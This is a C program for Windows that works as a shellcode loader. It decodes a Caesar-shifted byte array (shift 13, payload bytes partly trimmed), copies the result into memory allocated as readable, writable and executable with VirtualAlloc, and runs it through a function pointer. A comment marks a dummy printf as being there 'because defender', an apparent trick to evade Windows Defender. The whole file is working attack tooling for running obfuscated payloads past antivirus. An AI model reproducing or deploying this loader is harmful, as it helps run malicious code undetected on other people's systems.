#include <windows.h>
#include <stdio.h>


int main(void)
{
    char shellcode[782] = { 0 };
    int sc_len = sizeof(shellcode);

    char caesar[782] = { 0x09, 0x55, 0x90, 0xf1, 0xfd, 0xf5, 
        ---shellcode trimmed---
         0x12, 0xc8, 0x54, 0x20, 0x7f, 0x7c, 0x77, 0x0d, 0x66, 0x4e, 0x96, 0xe7, 0x0c, 0xe2 };

    // Decoding the shellcode
    for (int i = 0; i < sizeof(caesar); i++)
    {
        if ((caesar[i] - 13) < 0)
        {
	printf(""); // because defender
            shellcode[i] = caesar[i] + 256 - 13;
        }
        else
        {
            shellcode[i] = caesar[i] - 13;
        }
    }

    // Allocate memory for the shellcode
    void* exec_memory = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_memory == NULL)
    {
        printf("Memory allocation failed.\n");
        return 1;
    }

    // Copy shellcode to the allocated memory
    RtlCopyMemory(exec_memory, shellcode, sc_len);
    printf("[+] Copied shellcode to allocated memory\n");

    // Create a function pointer to the shellcode
    void(*func)() = (void(*)())exec_memory;
    printf("[+] Executing the shellcode...\n");

    // Execute the shellcode
    func();

    // Free allocated memory
    VirtualFree(exec_memory, 0, MEM_RELEASE);

    return 0;
}
